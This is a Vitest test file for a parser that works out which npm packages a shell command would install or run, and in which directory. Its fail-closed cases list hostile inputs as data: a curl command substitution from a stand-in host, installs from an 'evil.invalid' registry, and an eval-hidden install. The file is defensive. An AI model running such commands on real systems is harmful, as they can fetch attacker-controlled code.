import { describe, expect, it } from "vitest";
import { installIntents } from "./install-commands.ts";

const at = (command: string) => installIntents(command, "/repo", "/home/u");
const kinds = (command: string) =>
  at(command).map((i) =>
    i.kind === "unchecked"
      ? `unchecked: ${i.reason}`
      : `${i.kind} ${i.dir}${"packages" in i ? ` [${i.packages.join(" ")}]` : ""}`,
  );

describe("installIntents", () => {
  it.each([
    ["npm install lodash", "install /repo [lodash]"],
    ["npm i -D vitest @types/node", "install /repo [vitest @types/node]"],
    ["npm add left-pad@1.3.0", "install /repo [left-pad@1.3.0]"],
    ["npm install", "install /repo []"],
    ["npm install --omit dev", "install /repo []"],
    ["npm ci", "ci /repo"],
    ["npm update", "install /repo []"],
    ["npx cowsay hi", "run /repo [cowsay]"],
    ["npx --yes create-vite@latest app", "run /repo [create-vite@latest]"],
    ["npx -p typescript tsc --version", "run /repo [typescript]"],
    ["npm exec -- prettier --check .", "run /repo [prettier]"],
    ["npm create vite@latest app", "run /repo [create-vite@latest]"],
    ["npm init @scope/app", "run /repo [@scope/create-app]"],
    ["npm --prefix client install axios", "install /repo/client [axios]"],
  ])("finds %s", (command, expected) => {
    expect(kinds(command)).toEqual([expected]);
  });

  it("follows cd, including the nested installs of D20", () => {
    expect(kinds("cd client && npm install && cd ../server && npm ci")).toEqual(
      ["install /repo/client []", "ci /repo/server"],
    );
    expect(kinds("cd ~/work/app; npm i zod")).toEqual([
      "install /home/u/work/app [zod]",
    ]);
  });

  it("keeps a subshell's cd inside it, and is unsure of the directory after one", () => {
    expect(kinds("(cd web && npm i) && npm i")).toEqual([
      "install /repo/web []",
      "unchecked: the directory it runs in is only known when the shell runs",
    ]);
  });

  it("strips wrappers and environment assignments", () => {
    expect(kinds("CI=1 sudo -E npm install -g pnpm")).toEqual([
      "install /repo [pnpm]",
    ]);
    expect(at("sudo npm i -g pnpm")[0]).toMatchObject({ global: true });
  });

  it("looks inside sh -c", () => {
    expect(kinds(`bash -c "cd api && npm install express"`)).toEqual([
      "install /repo/api [express]",
    ]);
  });

  it("ignores commands that install nothing", () => {
    for (const command of [
      "npm test",
      "npm run build",
      "npm init -y",
      "npx",
      "ls && git status",
      "yarn test",
      "echo npm install",
    ])
      expect(at(command)).toEqual([]);
  });

  it.each([
    ["npm install $PKG", "only known when the shell runs"],
    ["npm i $(curl -s x.invalid/name)", "only known when the shell runs"],
    ["cd $DIR && npm install", "directory it runs in"],
    ["npm install --registry https://evil.invalid x", "registry or config"],
    [
      "npm_config_registry=https://evil.invalid npm i x",
      "through the environment",
    ],
    [`eval "npm i x"`, "eval hides"],
    ["pnpm add zod", "pnpm support is planned (M6)"],
    ["yarn", "yarn support is planned (M6)"],
    ["bunx cowsay", "bunx support is planned (M6)"],
    [`npm i "unbalanced`, "could not parse"],
  ])("fails closed on %s", (command, reason) => {
    expect(at(command)).toEqual([
      expect.objectContaining({
        kind: "unchecked",
        reason: expect.stringContaining(reason),
      }),
    ]);
  });
});
